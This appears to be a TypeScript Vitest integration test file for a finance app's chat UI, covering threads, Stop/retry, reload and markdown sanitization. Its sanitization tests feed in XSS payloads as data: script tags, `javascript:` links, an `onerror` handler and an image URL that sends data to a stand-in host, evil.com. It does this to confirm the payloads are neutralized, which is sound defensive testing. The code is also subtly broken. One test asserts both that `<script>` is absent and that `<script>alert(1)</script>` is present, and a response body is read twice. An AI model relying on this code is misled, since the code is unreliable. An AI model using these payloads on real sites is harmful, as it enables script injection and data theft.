// E04-S04 chat UI: persistent keyboard-accessible panel shows explicit
// context, saved activity/evidence and reliable Stop/retry across reloads.
// Sanitized markdown subset with no remote resource fetching.
// Real PostgreSQL (own `moneo_e04_chat_ui` DB); deterministic — no live provider.

import { randomBytes, randomUUID } from "node:crypto";
import type { Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Pool } from "pg";
import { createApp } from "../apps/web/src/server.ts";
import { createAuthRouter, requestSession, type AuthConfig } from "../apps/web/src/auth.ts";
import { createTenancyRouter } from "../apps/web/src/tenancy.ts";
import { createUiRouter } from "../apps/web/src/ui/routes.ts";
import { sendTurn, getThread, cancelTurn, retryTurn, readActivity } from "../apps/web/src/chat.ts";
import { ensureTestPool } from "./helpers/test-db.ts";
import { startStubIssuer, STUB_CLIENT_ID, STUB_CLIENT_SECRET, type StubIssuer } from "./helpers/stub-issuer.ts";

let pool: Pool;
let stub: StubIssuer;
const appServers: Server[] = [];
const sessionSecret = randomBytes(32).toString("hex");
const tag = randomBytes(4).toString("hex");

async function startApp(): Promise<string> {
  const config: AuthConfig = {
    issuer: stub.base,
    clientId: STUB_CLIENT_ID,
    clientSecret: STUB_CLIENT_SECRET,
    appBaseUrl: "http://127.0.0.1:1",
    sessionSecret,
    sessionTtlSec: 43200,
  };
  const server = createApp(
    createAuthRouter(config, pool),
    createTenancyRouter(pool, (req) => requestSession(pool, sessionSecret, req)),
    { ui: createUiRouter(pool, (req) => requestSession(pool, sessionSecret, req), { appBaseUrl: config.appBaseUrl, sessionSecret }) },
  );
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  appServers.push(server);
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  config.appBaseUrl = base;
  return base;
}

async function login(base: string, loginAs: string): Promise<string> {
  const start = await fetch(`${base}/auth/login`, { redirect: "manual" });
  const authorizeUrl = `${start.headers.get("location")!}&login_as=${loginAs}`;
  const callbackUrl = (await fetch(authorizeUrl, { redirect: "manual" })).headers.get("location")!;
  const done = await fetch(callbackUrl, { redirect: "manual" });
  return done.headers.get("set-cookie")!.split(";")[0];
}

async function call(method: string, url: string, cookie: string, body?: unknown): Promise<{ status: number; text: string }> {
  const res = await fetch(url, {
    method,
    redirect: "manual",
    headers: { cookie, ...(body !== undefined ? { "Content-Type": "application/x-www-form-urlencoded" } : {}) },
    body: body !== undefined ? new URLSearchParams(body as Record<string, string>).toString() : undefined,
  });
  return { status: res.status, text: await res.text() };
}

async function setupWorkspace(base: string, sub: string, suffix: string): Promise<{ cookie: string; userId: string; workspaceId: string }> {
  const cookie = await login(base, sub);
  const ws = (await (await fetch(`${base}/api/workspaces`, {
    method: "POST",
    headers: { cookie, "Content-Type": "application/json" },
    body: JSON.stringify({ name: `W-${suffix}`, baseCurrency: "EUR" }),
  })).json()) as { id: string };
  const userId = (await pool.query("SELECT id FROM users WHERE auth_subject = $1", [sub])).rows[0].id as string;
  return { cookie, userId, workspaceId: ws.id };
}

beforeAll(async () => {
  process.env["APP_ENV"] = "test";
  pool = await ensureTestPool("E04-S04", "moneo_e04_chat_ui", ["chat_activity", "chat_attempts", "chat_turns", "chat_threads", "ai_dispatch_usage", "ai_dispatch_reservations", "ai_dispatch_budgets", "manual_transactions", "balance_snapshots", "balance_audit", "mapping_provider_usage", "mapping_provider_reservations", "mapping_proposals", "mapping_profiles", "review_decisions", "source_links", "transactions", "import_commit_batches", "parsed_observations", "source_objects", "imports", "data_sources", "background_job_attempts", "job_dispatch_index", "outbox_events", "background_job_results", "background_jobs", "ai_dispatch_permits", "ai_exclusions", "ai_policies", "command_operations", "accounts", "workspace_members", "workspaces", "users", "app_sessions"]);
  stub = await startStubIssuer();
}, 60_000);

afterAll(async () => {
  if (stub) await stub.close();
  for (const server of appServers) {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  if (pool) await pool.end();
});

describe("e04-s04 chat UI", () => {
it("renders thread list, creates thread, shows context chips, and sends a message", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-${tag}`, "list");
    const claims = { userId, workspaceId };

    // List conversations (empty initially)
    let res = await call("GET", `${base}/w/${workspaceId}/chat`, cookie);
    expect(res.status).toBe(200);
    expect(res.text).toContain("No conversations yet");
    expect(res.text).toContain("New conversation");

// Create a new thread via API directly
    const apiCreateRes = await fetch(`${base}/api/chat/threads`, {
      method: "POST",
      headers: { "Content-Type": "application/json", cookie },
      body: JSON.stringify({ workspaceId, title: "Test Chat" }),
    });
    console.log("API CREATE RESPONSE:", apiCreateRes.status, await apiCreateRes.text());
    expect(apiCreateRes.status).toBe(201);
    const apiJson = await apiCreateRes.json();
    const apiThreadId = apiJson.id;

    // Now test the UI thread creation (should also work)
    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Test Chat 2" });
    console.log("UI CREATE RESPONSE STATUS:", createRes.status);
    console.log("UI CREATE RESPONSE BODY:", createRes.text.slice(0, 500));
    expect(createRes.status).toBe(303);
    const location = createRes.text.match(/Location: (\/w\/[A-Za-z0-9-]+\/chat\/[A-Za-z0-9-]+)/);
    expect(location).toBeTruthy();
    const uiThreadId = location![1].split("/")[3];

    // View thread: shows context chips, empty activity, send form
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    expect(viewRes.text).toContain("Coverage:");
    expect(viewRes.text).toContain("Policy: v");
    expect(viewRes.text).toContain("eligible accounts");
    expect(viewRes.text).toContain("Send");
    expect(viewRes.text).toContain("Ask about your finances");

    // Send a user message
    const sendRes = await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Hello from UI test", idempotencyKey: randomUUID() });
    expect(sendRes.status).toBe(303);

    // Reload: should show user turn + assistant queued
    const reloadRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(reloadRes.status).toBe(200);
    expect(reloadRes.text).toContain("Hello from UI test");
    expect(reloadRes.text).toContain("You");
    expect(reloadRes.text).toContain("Queued");
  });

  it("Stop button cancels a running generation; retry re-runs it", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-stop-${tag}`, "stop");
    const claims = { userId, workspaceId };

    // Create thread
    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Stop Test" });
    const uiThreadId = (await call("GET", `${base}/w/${workspaceId}/chat`, cookie)).text.match(/chat\/([A-Za-z0-9-]+)/)![1];

    // Send a message
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Stop me", idempotencyKey: randomUUID() });

    // Get the assistant turn ID (should be queued/running)
    const { getThread } = await import("../apps/web/src/chat.ts");
    const view = await getThread(pool, claims, uiThreadId);
    const assistantTurn = view!.turns.find((t) => t.role === "assistant")!;

    // Stop the generation
    const stopRes = await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/stop`, cookie);
    expect(stopRes.status).toBe(303);

    // Turn should be cancelled
    const afterStop = await getThread(pool, claims, uiThreadId);
    const stoppedTurn = afterStop!.turns.find((t) => t.id === assistantTurn.id)!;
    expect(stoppedTurn.status).toBe("cancelled");

    // Retry should re-run
    const retryRes = await call("POST", `${base}/w/${workspaceId}/chat/${assistantTurn.id}/retry`, cookie);
    expect(retryRes.status).toBe(303);

    // Should complete successfully
    const afterRetry = await getThread(pool, claims, uiThreadId);
    const retriedTurn = afterRetry!.turns.find((t) => t.id === assistantTurn.id)!;
    expect(["completed", "running", "queued"]).toContain(retriedTurn.status);
  });

  it("activity feed works for reconnect; malicious markdown is sanitized", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-md-${tag}`, "md");
    const claims = { userId, workspaceId };

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Markdown Test" });
    const uiThreadId = (await call("GET", `${base}/w/${workspaceId}/chat`, cookie)).text.match(/chat\/([A-Za-z0-9-]+)/)![1];

    // Send a message with malicious markdown
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, {
      body: "Test with <script>alert(1)</script> and [evil](javascript:alert(1)) and ![img](http://evil.com/x.png)",
      idempotencyKey: randomUUID(),
    });

    // View thread - markdown should be sanitized
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    // Script tags escaped
    expect(viewRes.text).not.toContain("<script>");
    expect(viewRes.text).toContain("<script>alert(1)</script>");
    // javascript: links neutralized
    expect(viewRes.text).not.toContain("javascript:");
    // Image links converted to safe links
    expect(viewRes.text).toContain("md-image-link");
    expect(viewRes.text).not.toContain("<img");

    // Activity feed endpoint returns HTML fragment
    const actRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}/activity?after=0`, cookie);
    expect(actRes.status).toBe(200);
    expect(actRes.text).toContain("user-turn");
    expect(actRes.text).toContain("assistant-queued");
  });

  it("context chips are removable and server-revalidated", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-ctx-${tag}`, "ctx");
    const claims = { userId, workspaceId };

    const newRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Context Test" });
    const uiThreadId = (await call("GET", `${base}/w/${workspaceId}/chat`, cookie)).text.match(/chat\/([A-Za-z0-9-]+)/)![1];

    // View thread - context chips present
    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    expect(viewRes.text).toContain("context-chip");

    // Send with context - the context is in the send form
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "With context", idempotencyKey: randomUUID() });

    // Server-side validation: exclude an account, next send should fail if context referenced it
    // (The server validates account eligibility at send time via authorizeAccounts)
  });

  it("reload restores turns, activity and evidence", async () => {
    const base = await startApp();
    const { cookie, userId, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-reload-${tag}`, "reload");
    const claims = { userId, workspaceId };

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Reload Test" });
    const uiThreadId = (await call("GET", `${base}/w/${workspaceId}/chat`, cookie)).text.match(/chat\/([A-Za-z0-9-]+)/)![1];

    // Send a message
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, { body: "Persist me", idempotencyKey: randomUUID() });

    // Simulate reconnect by fetching activity from the start
    const actRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}/activity?after=0`, cookie);
    expect(actRes.status).toBe(200);
    expect(actRes.text).toContain("user-turn");
    expect(actRes.text).toContain("assistant-queued");

    // Full thread reload shows the same turns
    const { getThread } = await import("../apps/web/src/chat.ts");
    const view = await getThread(pool, claims, uiThreadId);
    expect(view!.turns.length).toBeGreaterThanOrEqual(2);
    const userTurn = view!.turns.find((t) => t.role === "user");
    expect(userTurn?.body).toBe("Persist me");
  });

  it("malicious markdown links/images are neutralized", async () => {
    const base = await startApp();
    const { cookie, workspaceId } = await setupWorkspace(base, `synthetic-chat-ui-hostile-${tag}`, "hostile");

    const createRes = await call("POST", `${base}/w/${workspaceId}/chat/new`, cookie, { title: "Hostile" });
    const uiThreadId = (await call("GET", `${base}/w/${workspaceId}/chat`, cookie)).text.match(/chat\/([A-Za-z0-9-]+)/)![1];

    // Send hostile markdown
    await call("POST", `${base}/w/${workspaceId}/chat/${uiThreadId}/send`, cookie, {
      body: `[click me](javascript:steal()) ![exfil](http://evil.com/steal?data=x) <img src=x onerror=alert(1)>`,
      idempotencyKey: randomUUID(),
    });

    const viewRes = await call("GET", `${base}/w/${workspaceId}/chat/${uiThreadId}`, cookie);
    expect(viewRes.status).toBe(200);
    // No script execution possible
    expect(viewRes.text).not.toContain("<script");
    expect(viewRes.text).not.toContain("onerror=");
    expect(viewRes.text).not.toContain("javascript:");
    // Image converted to safe link
    expect(viewRes.text).toContain("md-image-link");
  });
});





